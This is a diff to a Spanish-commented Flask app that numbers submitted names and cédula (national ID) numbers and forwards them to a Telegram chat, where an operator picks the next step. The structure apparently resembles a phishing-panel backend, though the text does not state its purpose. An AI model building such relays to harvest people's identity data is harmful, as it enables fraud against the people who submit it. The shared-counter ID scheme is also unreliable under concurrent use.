@@ -3,6 +3,9 @@ from flask import Flask, request, render_template, jsonify
 from flask_socketio import SocketIO, emit
 import requests
 
+# Contador global para generar IDs únicos
+current_id = 1
+
 app = Flask(__name__)
 socketio = SocketIO(app)
 
@@ -19,13 +22,18 @@ def index():
 def intermediate_page():
     return render_template('intermediate.html')
 
-# Ruta para manejar datos ingresados
-@app.route('/submit', methods=['POST'])
-def submit():
-    data = request.form['data']
-    message = f"Nuevo dato recibido: {data}\nPor favor selecciona una opción:"
+# Ruta para manejar nombre ingresados
+@app.route('/submit_name', methods=['POST'])
+def submit_name():
+    global current_id  # Accedemos a la variable global
+    name = request.form['name']
+    identifier = f"ID-{current_id}"
+    current_id += 1  # Incrementamos el contador
+
+    # Mensaje con ID único y nombre
+    message = f"{identifier}: Nuevo nombre recibido: {name}\nPor favor selecciona una opción:"
     send_message_to_telegram_with_buttons(message)
-    return jsonify({"status": "success", "message": "Datos enviados a Telegram con opciones."})
+    return jsonify({"status": "success", "message": f"Nombre enviado con {identifier} a Telegram con opciones."})
 
 # Ruta para recibir webhook de Telegram
 @app.route('/webhook', methods=['POST'])
@@ -54,9 +62,10 @@ def webhook():
 @app.route('/submit_cedula', methods=['POST'])
 def submit_cedula():
     cedula = request.form['cedula']
-    message = f"Nuevo dato recibido (Cédula): {cedula}\nPor favor selecciona una opción:"
+    identifier = f"ID-{current_id - 1}"  # Usamos el último ID generado
+    message = f"{identifier}: Nuevo dato recibido (Cédula): {cedula}\nPor favor selecciona una opción:"
     send_message_to_telegram_with_buttons(message)
-    return jsonify({"status": "success", "message": "Cédula enviada a Telegram con opciones."})
+    return jsonify({"status": "success", "message": f"Cédula enviada con {identifier} a Telegram con opciones."})
 
 
 @app.route('/response')
